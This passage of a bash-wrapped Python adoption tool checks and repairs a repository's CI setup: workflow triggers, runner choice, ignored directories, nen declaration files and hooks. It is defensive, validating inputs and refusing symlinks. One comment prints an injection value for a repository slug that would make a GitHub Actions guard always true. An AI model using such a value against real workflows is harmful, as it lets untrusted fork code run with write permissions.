#!/usr/bin/env bash
# tenkai_adopt.sh — the deterministic engine behind hatsu:tenkai (zheref/hatsu#81).
#
# Hatsu owns this file. Nen does not. The skill
# `claude/skills/tenkai/SKILL.md` is the policy; this script is the reader and
# the writer, so adoption state cannot be counted in prose and mis-remembered on
# the next re-run. It follows `scripts/hanten_cycle_ledger.sh`'s house shape: a
# thin bash wrapper over one embedded python3 program, with a `--self-test` that
# builds real fixtures and proves both directions.
#
# THE TWO HARD REQUIREMENTS, AND WHY THEY SHAPE EVERY ITEM BELOW.
#
#   IDEMPOTENCE. `apply` is safe to run any number of times. Every item detects
#   before it writes and reports `satisfied` when it finds nothing to do, so a
#   second run performs zero writes and says so. This is not a nicety: a
#   repository that adopted at v0.30.0 and never re-ran Tenkai is the NORMAL
#   case, and an adoption path that is only safe once is an adoption path nobody
#   re-runs.
#
#   DRIFT REPAIR. The interesting state is not "absent", it is "present and
#   quietly wrong" — a workflow rendered for another repository's slug, a hook
#   from an older template, a runner label that no longer matches what this
#   repository derives. Those look installed. Every item therefore reports
#   `drift` distinctly from `missing`, with the observed and expected values
#   both named, because "it is there" is not the same claim as "it works".
#
# OWNERSHIP IS EXPLICIT AND NEVER IMPROVISED AROUND. An item whose file belongs
# to nen is DIAGNOSED here and REPAIRED by nen's own verb — this script prints
# the exact command and marks the item `routed` rather than hand-writing a
# `nen/contract.json`. A Nen-owned operation is never improvised in prose, and it
# is not improvised in a script either.
#
# USAGE
#   scripts/tenkai_adopt.sh diagnose      --repo <path> [--slug <owner/name>] [--json]
#   scripts/tenkai_adopt.sh apply         --repo <path> [--slug <owner/name>] [--json]
#   scripts/tenkai_adopt.sh runner-policy --visibility <public|private> --self-hosted <n> [--json]
#   scripts/tenkai_adopt.sh --self-test
#
#   --hatsu-root <path>   where templates/ lives. Defaults to this script's own
#                         parent, so an installed plugin copy resolves its own
#                         templates rather than the target repository's.
#   --visibility / --self-hosted  override the probe. `diagnose` and `apply`
#                         probe `gh` when these are absent and fall back to
#                         UNKNOWN (never to a guess) when it cannot answer.
#
# EXIT CODES
#   0  every item is satisfied (or was repaired, on `apply`)
#   1  at least one item is missing, drifted, routed or staged — work remains
#   2  an invocation or environment defect: no such repo, unreadable template
#
# 1 IS NOT A CRASH. It is the honest answer to "is this repository a working
# Hatsu consumer yet", and a caller that treats it as an error has misread the
# contract. 2 is the one that means this script could not do its job.
set -euo pipefail

HERE="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
export TENKAI_DEFAULT_ROOT="$(dirname "$HERE")"

python3 - "$@" <<'PY'
import json
import os
import re
import hashlib
import shutil
import subprocess
import sys
import tempfile
from pathlib import Path

# Windows PowerShell can start Python with a legacy console encoding. Adoption
# reports contain Unicode policy text, so make their output portable as well.
if hasattr(sys.stdout, "reconfigure"):
    sys.stdout.reconfigure(encoding="utf-8")
    sys.stderr.reconfigure(encoding="utf-8")

CONTRACT = "hatsu.tenkai.adoption/v0.1"
_FIXTURES: list = []
HOSTED_RUNNER = "ubuntu-latest"
WORKFLOW_PATH = ".github/workflows/pr-readiness.yml"

# THE ADMITTED PRIVILEGED TRIGGERS — maintainer's ruling, 2026-09-19, as
# corrected the same day. The closed set lives in
# `scripts/workflow_runner_policy_check.rb`'s ALLOWED_TRIGGERS and is mirrored
# here so a CONSUMER's rendered workflow is held to it too.
#
# WHY BOTH ARE REQUIRED, NOT MERELY PERMITTED. With `pull_request_target` alone
# the verdict is computed at PUSH time -- while the checks are still pending --
# and is never recomputed. The conjuncts change on events that trigger cannot
# see: CON-32(b)/CON-16 when a review lands. So the `ready` transition, which
# normally happens when the reviewer approves, would essentially never be
# published and the check would read not-ready almost always. A consumer
# provisioned with the single-trigger form inherits exactly that bug, which is
# why a MISSING trigger is drift and not a stylistic difference.
#
# WHY NOT A THIRD. `pull_request_review_thread` WAS ADMITTED BRIEFLY AND REMOVED,
# and this is the correction that matters most here: it is a WEBHOOK event and
# NOT a supported Actions trigger, so a workflow naming it CANNOT REGISTER AT
# ALL. An earlier version of this file required it, which meant `apply` would
# have reported a correct workflow as drift and then "repaired" it into one that
# does not run -- the tool actively breaking the consumer it was adopting.
# `check_suite` is refused for a different reason: its payload carries no
# `github.event.pull_request` (only `check_suite.pull_requests[]`), so it would
# need a second and weaker guard, and it fires for forks. Either way a consumer
# that appears to need one is a ruling to escalate, never a template variation.
#
# CON-32(d) -- unresolved threads -- therefore has NO TRIGGER AVAILABLE. That is
# a named limitation, not an oversight, and § 5c of the skill states it.
REQUIRED_TRIGGERS = ("pull_request_target", "pull_request_review")
GUARD_PATH = "scripts/workflow_runner_policy_check.rb"
# The review ledger's persona sets, kept equal to scripts/hanten_cycle_ledger.sh's
# DEFAULT_MAXIMA keys and LATE_PERSONAS -- the self-test reads that script and fails on drift.
REVIEW_PERSONAS = ("nobunaga", "feitan", "chrollo", "phinks", "hisoka", "uvogin", "leorio")
LATE_REVIEW_PERSONAS = ("leorio",)

# States, most-satisfied first. `apply` turns missing/drift into repaired; it
# never turns routed, staged or blocked into anything, because those are owned
# elsewhere or deliberately deferred.
SATISFIED, REPAIRED, MISSING, DRIFT, ROUTED, STAGED, BLOCKED = (
    "satisfied", "repaired", "missing", "drift", "routed", "staged", "blocked")
OUTSTANDING = {MISSING, DRIFT, ROUTED, STAGED, BLOCKED}

# The five declaration files nen owns and validates. Tenkai reads them and
# routes their repair; it writes none of them.
NEN_DECLARATIONS = [
    ("nen/contract.json", "what nen EXECUTES — lanes, argv, preconditions, hosts, targets"),
    ("nen/workflow.json", "what the workflow DECIDES with — branch shape, checks, coverage, trailers"),
    ("nen/gates.json", "the readiness gate — reviewer identities, approval policy, carve-outs"),
    ("nen/labels.json", "the label vocabulary `hatsu:file` validates a filing against"),
    ("nen/repos.json", "the consumer and product-code registry"),
]


# REPOSITORY ROLE — maintainer's ruling, 2026-09-19. Derived, never asked when
# the registry can answer, and never invented.
#
# The 2026-09-18 ruling already splits repositories by ROLE rather than by file
# kind: a CANON repository's product IS the process, so merging there changes
# what other repositories do; everything else is a consumer. `nen/repos.json`
# already records that split in machine-readable form -- `maintained_tools` are
# the process/system repositories, `consumers` are the products -- so Tenkai
# reads it rather than parsing canon prose or adding a third question to the
# preamble.
#
# WHY THE ROLE MATTERS HERE. A process/system repository is one
# whose releases other repositories consume, so its `release` row must be real:
# a SEAT there means `hatsu:mugetsu` -- whose whole job is to execute that row at
# G3 -- has nothing to execute, and publication happens by hand, outside the
# machinery. A product chooses its own publisher and destination; Tenkai does
# not render the process publisher there, but it does report an absent or seated
# release row and every other declared lane seat. Otherwise "adopted" conceals
# the very configuration work the product still needs.
ROLE_PROCESS, ROLE_PRODUCT = "process", "product"


def derive_role(repo: Path, slug):
    """process / product / None — None means the registry names neither."""
    p = repo / "nen" / "repos.json"
    if not p.is_file() or not slug:
        return None
    try:
        d = json.loads(p.read_text())
    except Exception:
        return None
    # VALID JSON IS NOT A VALID REGISTRY. A top-level `[]` parses, and then
    # `d.get(...)` raised AttributeError -- so Tenkai CRASHED instead of returning
    # the unknown-role `blocked` it promises. Shape is checked, not assumed.
    if not isinstance(d, dict):
        return None

    def slugs(key):
        out = set()
        v = d.get(key)
        if not isinstance(v, list):
            return out
        for e in v:
            if isinstance(e, dict):
                out.add(e.get("repo"))
            elif isinstance(e, str):
                out.add(e)
        return out

    if slug in slugs("maintained_tools"):
        return ROLE_PROCESS
    if slug in slugs("consumers"):
        return ROLE_PRODUCT
    return None


def _default_lane(repo: Path):
    """The lane a release row would be declared on, and its declared stack."""
    p = repo / "nen" / "contract.json"
    if not p.is_file():
        return None, None
    try:
        proj = json.loads(p.read_text()).get("project") or {}
    except Exception:
        return None, None
    # NO FIRST-LANE FALLBACK. Picking `lanes[0]` invented the very thing this
    # function exists to derive: nen's rule is that a null `defaultLane` makes
    # `--lane` REQUIRED, so a guessed lane can route the release row to a lane nen
    # would never select by default. An absent defaultLane is reported as unknown.
    lane = proj.get("defaultLane")
    if not lane:
        return None, None
    stack = ((proj.get("lanes") or {}).get(lane) or {}).get("stack")
    return lane, stack


def _release_row(repo: Path):
    """satisfied / seat / absent — read from the declaration, never guessed."""
    lane, _ = _default_lane(repo)
    p = repo / "nen" / "contract.json"
    if not lane or not p.is_file():
        return "absent"
    try:
        verbs = (json.loads(p.read_text()).get("project") or {}).get("verbs") or {}
    except Exception:
        return "absent"
    row = (verbs.get(lane) or {}).get("release")
    if row is None:
        return "absent"
    if isinstance(row, dict) and "unsupported" in row:
        return "seat"
    return "declared"


def _atomic_write(path: Path, text: str):
    """Write through a temp file in the same directory, then os.replace.

    A direct `write_text` that dies mid-call leaves a TRUNCATED workflow or hook
    behind rather than the previous one -- and these are files a repository's CI
    depends on. `scripts/hanten_cycle_ledger.sh` already writes this way.
    """
    fd, tmp = tempfile.mkstemp(dir=str(path.parent), prefix=".tenkai-", suffix=".tmp")
    try:
        with os.fdopen(fd, "w") as fh:
            fh.write(text)
        os.replace(tmp, str(path))
    except BaseException:
        try:
            os.unlink(tmp)
        except OSError:
            pass
        raise


def usage(msg):
    print(f"tenkai_adopt: {msg}", file=sys.stderr)
    raise SystemExit(2)


# --------------------------------------------------------------------------
# Runner selection — the maintainer's ruling of 2026-09-19, encoded once.
# --------------------------------------------------------------------------
def derive_runner(visibility, self_hosted, portable=True):
    """Derive a runner label from the repository's own measured facts.

    THE RULING. A self-hosted PREFERENCE is right where hosted minutes are
    genuinely billed and the security calculus differs -- a PRIVATE consumer
    repository with a runner actually registered. It is wrong everywhere else,
    and #81 measured why on `zheref/hatsu` itself:

      * PUBLIC repositories get GitHub-hosted STANDARD runners free and
        unlimited, so there is no bill to avoid; and GitHub's own guidance is
        not to attach self-hosted runners to a public repository, because a
        fork PR can execute arbitrary code on the runner.
      * ZERO REGISTERED RUNNERS means a preference queues the job against a
        runner that never appears. A check that never completes is strictly
        worse than a bill that is currently zero -- and if it is ever made
        required, it blocks every merge, permanently.

    So the policy is DERIVED, never assumed, and it always terminates on a
    runner that exists. `fallback` is the label to fall back to and is never
    None: a job can never hang on an absent runner.
    """
    if visibility is None:
        return {
            "runs_on": HOSTED_RUNNER,
            "labels_required": False,
            "fallback": HOSTED_RUNNER,
            "reason": "repository visibility could not be read, so the hosted runner is used — "
                      "the derivation never guesses toward a runner that might not exist",
            "derived_from": {"visibility": None, "self_hosted": self_hosted, "portable": portable},
        }
    if visibility != "private":
        return {
            "runs_on": HOSTED_RUNNER,
            "labels_required": False,
            "fallback": HOSTED_RUNNER,
            "reason": f"repository is {visibility}: hosted standard runners are free and unlimited, "
                      "so there is no bill to avoid, and GitHub advises against self-hosted runners "
                      "on public repositories because a fork PR can execute code on them",
            "derived_from": {"visibility": visibility, "self_hosted": self_hosted, "portable": portable},
        }
    if not self_hosted:
        return {
            "runs_on": HOSTED_RUNNER,
            "labels_required": False,
            "fallback": HOSTED_RUNNER,
            "reason": "repository is private, but zero self-hosted runners are registered: a "
                      "preference would queue this job against a runner that never appears, and a "
                      "check that never completes is worse than a bill that is currently zero",
            "derived_from": {"visibility": visibility, "self_hosted": self_hosted, "portable": portable},
        }
    # A BARE `self-hosted` IS THE BROADEST SELECTOR THERE IS -- any runner
    # registered to the repository OR its organisation, including runners shared
    # with other repositories, and non-ephemeral by default while this job checks
    # PR-controlled content into its workspace. This repository's own guard admits
    # only LABELLED SETS for that reason, and would reject the bare scalar
    # outright. The label set is the consumer's own data, which Tenkai does not
    # invent -- so the derivation names the requirement instead of guessing one.
    return {
        "runs_on": "self-hosted",
        "labels_required": True,
        "fallback": HOSTED_RUNNER,
        "reason": f"repository is private with {self_hosted} self-hosted runner(s) registered: "
                  "hosted minutes are genuinely billed here and the fork-exposure argument does not "
                  f"apply to a private repository. Falls back to {HOSTED_RUNNER} if the runner is gone",
        "derived_from": {"visibility": visibility, "self_hosted": self_hosted, "portable": portable},
    }


def _on_block(live: str) -> str:
    """The workflow's `on:` mapping, and nothing else.

    `"on":` and `'on':` are accepted deliberately: bare `on` is the YAML 1.1
    boolean `true`, so many repositories quote it ON PURPOSE. An earlier draft
    matched the bare form only and reported a correct workflow as missing every
    trigger -- with the consequence sentence asserted confidently about a file
    that did not have the defect. The child indent is derived from the first
    child line rather than assumed to be two spaces, for the same reason.
    """
    lines = live.splitlines()
    try:
        start = next(i for i, l in enumerate(lines)
                     if l.rstrip() in ('on:', '"on":', "'on':"))
    except StopIteration:
        return ""
    out = []
    for l in lines[start + 1:]:
        if l.strip() and not l.startswith(" "):
            break
        out.append(l)
    return "\n".join(out)


def _on_keys(live: str):
    """Top-level event keys of the `on:` block, at whatever indent it uses."""
    block = _on_block(live)
    child = None
    for l in block.splitlines():
        if l.strip() and not l.lstrip().startswith("#"):
            child = len(l) - len(l.lstrip())
            break
    if child is None:
        return None            # an `on:` we could not parse -- NOT "declares nothing"
    return set(re.findall(rf"^ {{{child}}}([A-Za-z_][A-Za-z0-9_-]*):", block, re.M))


# --------------------------------------------------------------------------
# Context
# --------------------------------------------------------------------------
def probe_gh(slug, field):
    if not shutil.which("gh"):
        return None
    try:
        out = subprocess.run(
            ["gh", "api", f"repos/{slug}" if field == "visibility" else f"repos/{slug}/actions/runners",
             "--jq", ".visibility" if field == "visibility" else ".total_count"],
            capture_output=True, text=True, timeout=30)
    except Exception:
        return None
    if out.returncode != 0:
        return None
    val = out.stdout.strip()
    return int(val) if field == "runners" and val.isdigit() else (val or None)


# GitHub's own owner/repo grammar. THE SLUG IS SUBSTITUTED INTO A SINGLE-QUOTED
# GITHUB EXPRESSION, so a value carrying a quote does not merely render wrongly --
# it RESTRUCTURES the predicate. Measured: an `origin` of
# `https://github.com/acme/widget' || true || '.git` rendered
#   if: ${{ github.repository == 'acme/widget' || true || '' && <fork limb> }}
# which is valid YAML and reduces to `A || true || ('' && B)` -- CONSTANT TRUE,
# because `&&` binds tighter than `||`. Both limbs die at once, and a
# `pull_request_target` job holding `checks: write` and a token would then run on
# FORK pull requests. The template's "a wrong slug fails CLOSED" is true of a
# wrong slug and false of a hostile one, so the slug is validated before anything
# consumes it -- the workflow render AND the `gh api repos/<slug>` path.
SLUG_RE = re.compile(r"^[A-Za-z0-9._-]{1,39}/[A-Za-z0-9._-]{1,100}$")
# THE SAME LESSON AS THE SLUG, ONE FIELD LATER. `--runner-labels` is substituted
# straight into `runs-on:`, so an unvalidated value can carry YAML structure or a
# `${{ }}` expression and change the workflow well beyond a runner label set --
# and `diagnose` would then read its own rendering back as satisfied. Only a bare
# label or a flow sequence of bare labels is admitted.
LABELS_RE = re.compile(r"^(?:[A-Za-z0-9][A-Za-z0-9._-]{0,64}"
                       r"|\[[A-Za-z0-9][A-Za-z0-9._-]{0,64}(?:, *[A-Za-z0-9][A-Za-z0-9._-]{0,64})*\])$")


def slug_ok(slug):
    return bool(slug) and bool(SLUG_RE.match(slug))


def git_slug(repo):
    try:
        out = subprocess.run(["git", "-C", str(repo), "remote", "get-url", "origin"],
                             capture_output=True, text=True, timeout=15)
    except Exception:
        return None
    if out.returncode != 0:
        return None
    url = out.stdout.strip()
    m = re.search(r"[:/]([^/:]+/[^/]+?)(?:\.git)?$", url)
    return m.group(1) if m else None


def git_dir(repo):
    try:
        out = subprocess.run(["git", "-C", str(repo), "rev-parse", "--git-common-dir"],
                             capture_output=True, text=True, timeout=15)
    except Exception:
        return None
    if out.returncode != 0:
        return None
    p = Path(out.stdout.strip())
    return p if p.is_absolute() else (repo / p)


class Ctx:
    def __init__(self, repo, hatsu_root, slug, visibility, self_hosted, probe, runner_labels=None):
        self.repo = repo
        self.hatsu_root = hatsu_root
        self.slug = slug or git_slug(repo)
        # ONE gate for both the derived and the --slug path.
        if self.slug is not None and not slug_ok(self.slug):
            usage(f"refusing slug {self.slug!r}: not <owner>/<name> in GitHub's grammar "
                  f"([A-Za-z0-9._-]). A slug is substituted into a single-quoted GitHub "
                  f"expression and into a `gh api repos/<slug>` path, so a value outside that "
                  f"grammar can restructure the job's guard predicate rather than merely break it")
        self.git_dir = git_dir(repo)
        self.notes = []
        if visibility is None and probe and self.slug:
            visibility = probe_gh(self.slug, "visibility")
        if self_hosted is None and probe and self.slug:
            self_hosted = probe_gh(self.slug, "runners")
        self.visibility = visibility
        self.self_hosted = self_hosted or 0
        self.role = derive_role(repo, self.slug)
        self.runner = derive_runner(visibility, self.self_hosted)
        self.runner_labels = runner_labels
        if runner_labels is not None and not LABELS_RE.match(runner_labels):
            usage(f"refusing --runner-labels {runner_labels!r}: only a bare label or a flow "
                  f"sequence of bare labels is admitted. The value is substituted into `runs-on:`, "
                  f"so YAML structure or a ${{{{ }}}} expression there changes the workflow rather "
                  f"than selecting a runner")
        if self.runner.get("labels_required") and runner_labels:
            self.runner["runs_on"] = runner_labels
            self.runner["labels_required"] = False

    def template(self, name):
        p = self.hatsu_root / "templates" / name
        if not p.is_file():
            usage(f"no template at {p} — --hatsu-root must point at a Hatsu checkout or plugin root")
        return p.read_text()

    def nen_ref(self):
        """The bootstrap ref is Hatsu's pin, not a guessed consumer dependency."""
        try:
            contract = json.loads((self.hatsu_root / "nen" / "contract.json").read_text())
            ref = contract["dependency"]["pinned_ref"]
        except (OSError, ValueError, KeyError, TypeError):
            return None
        if not isinstance(ref, str) or not re.fullmatch(r"[A-Za-z0-9][A-Za-z0-9._/-]{0,99}", ref):
            return None
        if ".." in ref or "//" in ref:
            return None
        return ref


# --------------------------------------------------------------------------
# Items
# --------------------------------------------------------------------------
class Item:
    def __init__(self, ident, title, owner):
        self.id, self.title, self.owner = ident, title, owner

    def row(self, state, detail, action=None):
        return {"id": self.id, "title": self.title, "owner": self.owner,
                "state": state, "detail": detail, "action": action}


class NenDeclaration(Item):
    """Present-and-parseable is all Tenkai asserts. nen schema check is the
    authority on validity and this script never second-guesses it."""

    def __init__(self, path, what):
        super().__init__(path, what, "nen")
        self.path = path

    def detect(self, ctx):
        p = ctx.repo / self.path
        if not p.is_file():
            return self.row(ROUTED, f"absent — nen owns this file and Tenkai does not hand-write one",
                            f"nen scaffold init --repo {ctx.repo}")
        if self.path.endswith(".json"):
            try:
                json.loads(p.read_text())
            except Exception as exc:
                return self.row(BLOCKED, f"present but not parseable JSON: {exc}",
                                "repair by hand; a malformed declaration is not Tenkai's to rewrite")
        return self.row(SATISFIED, "present and parseable")

    def repair(self, ctx):
        return self.detect(ctx)   # never written here; routing is the repair


class ColorsFile(Item):
    """nen ships NO built-in colour table and no fallback, so nothing scaffolds
    this file. Hatsu does, because the vocabulary the shipped skills resolve is
    Hatsu's own."""

    def __init__(self):
        super().__init__("nen/colors.yml", "the colour vocabulary backlog-state and backlog-board resolve", "hatsu")

    def detect(self, ctx):
        p = ctx.repo / "nen" / "colors.yml"
        # A SYMLINK IS NOT THIS REPOSITORY'S FILE. `is_file()` follows links and so
        # does `write_text`, so a nen/colors.yml pointing outside the target let
        # `repair` overwrite an arbitrary external path. Refused, never followed.
        if p.is_symlink():
            return self.row(BLOCKED,
                            f"nen/colors.yml is a symlink to {os.readlink(p)!r} — Tenkai does not "
                            f"follow a link out of the repository it was pointed at",
                            "replace it with a regular file, or point --repo at the real checkout")
        if not p.is_file():
            return self.row(MISSING, "absent — `nen schema check` will exit 1 and `nen color status` "
                                     "cannot run against this repository at all",
                            "render templates/colors.yml")
        # PARSE, DO NOT SUBSTRING. `"categories:" in text` was satisfied by the word
        # appearing in a COMMENT, so a file containing only `# categories:` read as
        # satisfied while `nen schema check` still failed and the consumer still did
        # not work. The block must exist at column 0 with at least one child key.
        live = [l for l in p.read_text().splitlines() if not l.lstrip().startswith("#")]
        try:
            i = next(n for n, l in enumerate(live) if l.rstrip() in ("categories:", '"categories":'))
        except StopIteration:
            return self.row(DRIFT, "present but declares no `categories:` block outside its comments",
                            "re-render from templates/colors.yml")
        kids = [l for l in live[i + 1:] if l.strip() and not l.startswith(" ")]
        children = [l for l in live[i + 1:len(live) if not kids else live.index(kids[0], i + 1)]
                    if l.strip()]
        if not children:
            return self.row(DRIFT, "`categories:` is declared but empty — nen will refuse the "
                                   "taxonomy and `nen color status` still cannot resolve a row",
                            "re-render from templates/colors.yml")
        return self.row(SATISFIED, f"present, categories block declares {len(children)} line(s)")

    def repair(self, ctx):
        cur = self.detect(ctx)
        if cur["state"] in (SATISFIED, BLOCKED):
            return cur
        p = ctx.repo / "nen" / "colors.yml"
        if p.is_symlink():
            return cur
        p.parent.mkdir(parents=True, exist_ok=True)
        _atomic_write(p, ctx.template("colors.yml"))
        return self.row(REPAIRED, "rendered from templates/colors.yml — tune the values, they are a seed")


class IgnoredDir(Item):
    """A directory the process writes into, which must exist AND be ignored.
    Both halves: an unignored Reports/ puts a rendered HTML report into somebody's
    next commit."""

    def __init__(self, ident, rel, why):
        super().__init__(ident, why, "hatsu")
        self.rel = rel

    def _ignored(self, ctx):
        """True / False / None -- and None is the point.

        `git check-ignore` cannot answer in a directory that is not a repository
        yet. Reading that as "not ignored" made `repair` APPEND unconditionally,
        so three `apply` runs against a non-git directory produced three copies of
        `Reports/` and `.nen/` in .gitignore -- idempotence failing in the exact
        "new repository" case the skill's own description claims.
        """
        if ctx.git_dir is None:
            return None
        probe = f"{self.rel}/probe"
        try:
            out = subprocess.run(["git", "-C", str(ctx.repo), "check-ignore", "-q", probe],
                                 capture_output=True, text=True, timeout=15)
            return out.returncode == 0
        except Exception:
            return None

    def detect(self, ctx):
        d = ctx.repo / self.rel
        gi = ctx.repo / ".gitignore"
        # A SYMLINKED MANAGED DIRECTORY IS NOT THIS REPOSITORY'S. `is_dir()` follows
        # links, so a `Reports` or `.nen` pointing outside the target read as
        # satisfied and every later Hatsu write through it escaped `--repo`. The
        # same holds for `.gitignore`, which `repair` appends to.
        if d.is_symlink():
            return self.row(BLOCKED,
                            f"{self.rel}/ is a symlink to {os.readlink(d)!r} — Tenkai does not "
                            f"treat a link out of the repository as this repository's directory",
                            "replace it with a real directory, or point --repo at the real checkout")
        if gi.is_symlink():
            return self.row(BLOCKED,
                            f".gitignore is a symlink to {os.readlink(gi)!r} — appending through it "
                            f"would write outside the repository Tenkai was pointed at",
                            "replace it with a regular file")
        exists = d.is_dir()
        ignored = self._ignored(ctx)
        if ignored is None:
            return self.row(BLOCKED,
                            f"not a git repository — there is nothing to ignore {self.rel}/ into yet",
                            "run `git init` (or `nen scaffold init`) first, then re-run apply")
        if exists and ignored:
            return self.row(SATISFIED, f"{self.rel}/ exists and is ignored")
        missing = []
        if not exists:
            missing.append("does not exist")
        if not ignored:
            missing.append("is not git-ignored")
        state = MISSING if not exists else DRIFT
        return self.row(state, f"{self.rel}/ " + " and ".join(missing),
                        f"mkdir {self.rel}/ and add it to .gitignore")

    def repair(self, ctx):
        cur = self.detect(ctx)
        if cur["state"] == SATISFIED:
            return cur
        if cur["state"] == BLOCKED:
            return cur
        did = []
        d = ctx.repo / self.rel
        if not d.is_dir():
            d.mkdir(parents=True, exist_ok=True)
            (d / ".gitkeep").write_text("")
            did.append("created")
        if self._ignored(ctx) is False:
            gi = ctx.repo / ".gitignore"
            if gi.is_symlink():
                return self.detect(ctx)          # blocked; never append through a link
            prev = gi.read_text() if gi.is_file() else ""
            if prev and not prev.endswith("\n"):
                prev += "\n"
            _atomic_write(gi, prev + f"{self.rel}/\n")
            did.append("added to .gitignore")
        return self.row(REPAIRED, f"{self.rel}/ " + " and ".join(did))


class NenCommitMsgHook(Item):
    """DIAGNOSED here, REPAIRED by nen -- and the correction matters.

    An earlier revision of this file RENDERED a Hatsu-authored `commit-msg` hook
    from `templates/commit-msg`. That was wrong by this repository's own canon:
    `docs/ROSTER.md` § 2 assigns layer (b) of the three-layer attribution
    enforcement to "a target repository's `commit-msg` hook, generated by
    `nen scaffold init` from `allowedAttributionTrailers`", and
    `nen scaffold init` installs exactly that, at exactly this path, from exactly
    that policy file.

    The duplication was DESTRUCTIVE IN BOTH ORDERINGS, measured on fixtures:
    Tenkai first, and `nen scaffold init` refuses ("a different commit-msg hook
    already exists ... refusing to overwrite it"); nen first, and Tenkai reported
    the generated hook as foreign drift and advised DELETING it -- so the item
    could never reach satisfied and `apply` could never exit 0.

    So this item now does what every other nen-owned item does: it asserts
    presence and routes. Tenkai writes no hook, which also removes three
    ways the old one could go wrong -- a write outside `--repo` through the git
    common dir, a followed symlink, and `core.hooksPath` being ignored so the
    hook was reported "installed and current" where git would never run it.
    """

    def __init__(self):
        super().__init__("hooks/commit-msg", "the commit trailer gate, generated from nen/workflow.json", "nen")

    @staticmethod
    def _dest(ctx):
        """Where git will ACTUALLY look, `core.hooksPath` included."""
        gd = ctx.git_dir
        if gd is None:
            return None
        try:
            out = subprocess.run(["git", "-C", str(ctx.repo), "config", "--get", "core.hooksPath"],
                                 capture_output=True, text=True, timeout=15)
            if out.returncode == 0 and out.stdout.strip():
                hp = Path(out.stdout.strip())
                return (hp if hp.is_absolute() else ctx.repo / hp) / "commit-msg"
        except Exception:
            pass
        return gd / "hooks" / "commit-msg"

    def detect(self, ctx):
        dest = self._dest(ctx)
        if dest is None:
            return self.row(BLOCKED, "not a git repository — there is no hooks directory to look in")
        if dest.is_file():
            return self.row(SATISFIED, f"present at {dest}")
        return self.row(ROUTED,
                        f"no commit-msg hook at {dest} — the repository's trailer policy is enforced "
                        f"by the agent-side refusal and by `nen commit format` / `nen wc squash`, but "
                        f"not by git. nen owns this hook and Tenkai does not write one",
                        f"nen scaffold init --repo {ctx.repo} --agent-trailer Hatsu-Agent")

    def repair(self, ctx):
        return self.detect(ctx)   # never written here; routing IS the repair


class GuardRegistration(Item):
    """Half one of the two-PR ordering, detected rather than walked into.

    THE MECHANISM (zheref/hatsu#80). The policy guard that judges a PR is the
    TRUSTED copy from `main`, run against the PR's tree; the PR's own copy never
    executes. So a PR that both registers a workflow in the guard's tables AND
    adds the workflow file is judged by a guard that cannot know the file, and
    fails. Registration must land FIRST, in its own PR.

    Tenkai does not edit an arbitrary Ruby guard -- it DETECTS which half has
    landed and gates the workflow item on it, so a consumer inherits the ordering
    as a sequenced plan instead of as a red check they have to diagnose.
    """

    def __init__(self):
        super().__init__("guard/registration", "pr-readiness.yml registered in the workflow policy guard", "hatsu")

    # THE THREE CONSTANTS THAT CONSTITUTE REGISTRATION, and only those.
    # A whole-file substring is COMMENT-STRENGTH, not grep-strength: this
    # repository's own guard names `pr-readiness.yml` in a COMMENT on line 13,
    # and a guard whose only mention is `# TODO: someday register pr-readiness.yml`
    # scored as registered -- so `apply` would write the workflow into a
    # repository whose guard cannot know it, which is the exact pull request that
    # fails every required check for one cause. `PORTABLE_HOSTED_WORKFLOWS` is
    # excluded on purpose: the routed action tells the maintainer NOT to add the
    # file there, so mentioning it must not satisfy the gate either.
    REGISTRATION_CONSTANTS = ("EXPECTED_JOBS", "EXPECTED_TYPES", "EXPECTED_STEPS")

    @staticmethod
    def state_of(ctx):
        g = ctx.repo / GUARD_PATH
        if not g.is_file():
            return "absent"          # no guard: no ordering constraint at all
        src = "\n".join(l for l in g.read_text().splitlines()
                        if not l.lstrip().startswith("#"))
        named = [c for c in GuardRegistration.REGISTRATION_CONSTANTS
                 if re.search(rf"{c}\s*=.*?pr-readiness\.yml", src, re.S)]
        return "registered" if len(named) == len(GuardRegistration.REGISTRATION_CONSTANTS) else "unregistered"

    def detect(self, ctx):
        st = self.state_of(ctx)
        if st == "absent":
            return self.row(SATISFIED, f"no {GUARD_PATH} in this repository — no two-PR ordering applies")
        if st == "registered":
            return self.row(SATISFIED, "the guard already names pr-readiness.yml — the workflow may land next")
        return self.row(ROUTED,
                        "the guard does not name pr-readiness.yml. This must land in its OWN pull request, "
                        "BEFORE the workflow file: the guard judging a PR is the trusted copy from the base "
                        "branch, so a PR adding both is judged by a guard that cannot know the file",
                        "register pr-readiness.yml in the guard's EXPECTED_JOBS / EXPECTED_TYPES / EXPECTED_STEPS, "
                        "and do NOT add it to PORTABLE_HOSTED_WORKFLOWS — that constant doubles as the "
                        "required-PRESENCE list, so naming a file that does not exist yet fails every PR "
                        "from the other direction")

    def repair(self, ctx):
        return self.detect(ctx)


class ReadinessWorkflow(Item):
    """Half two. Rendered with this repository's own slug and derived runner."""

    def __init__(self):
        super().__init__(WORKFLOW_PATH, "the readiness check run, rendered for this repository", "hatsu")

    MARKER = "RENDERED BY hatsu:tenkai"

    def render(self, ctx, keep_runs_on=None):
        t = ctx.template("pr-readiness.yml")
        # PRESERVE A RUNNER WE COULD NOT VERIFY. `detect` correctly declines to
        # compare `runs-on` when the probe could not answer -- but `repair` still
        # rendered `derive_runner(None, ...)`'s hosted default, so an UNRELATED
        # drift (a dropped --gates, say) silently downgraded a valid private
        # workflow off its self-hosted labelled runner. Declining to judge a fact
        # and then overwriting it is worse than either alone.
        runs_on = keep_runs_on or ctx.runner["runs_on"]
        process = ctx.role == ROLE_PROCESS
        return (t.replace("@@REPO_SLUG@@", ctx.slug)
                 .replace("@@RUNS_ON@@", runs_on)
                 .replace("@@RUNNER_REASON@@", ctx.runner["reason"])
                 .replace("@@GUARD_REQUIRED@@", "true" if process else "false")
                 .replace("@@PIN_FALLBACK_ALLOWED@@", "false" if process else "true")
                 .replace("@@NEN_REF@@", ctx.nen_ref()))

    def detect(self, ctx):
        if ctx.role is None:
            return self.row(BLOCKED, "repository role is unknown; the trusted guard and pin policy "
                            "cannot be rendered safely", "record the role in nen/repos.json")
        if ctx.nen_ref() is None:
            return self.row(BLOCKED, "Hatsu's dependency.pinned_ref is absent or malformed; "
                            "the readiness workflow cannot bootstrap Nen", "repair Hatsu's nen/contract.json")
        # BEFORE the file check, so `repair`'s BLOCKED early-return stops the write
        # on a fresh repository too -- not only where a file already exists.
        if ctx.runner.get("labels_required"):
            return self.row(BLOCKED,
                            "this repository derives a self-hosted runner, but a BARE `self-hosted` "
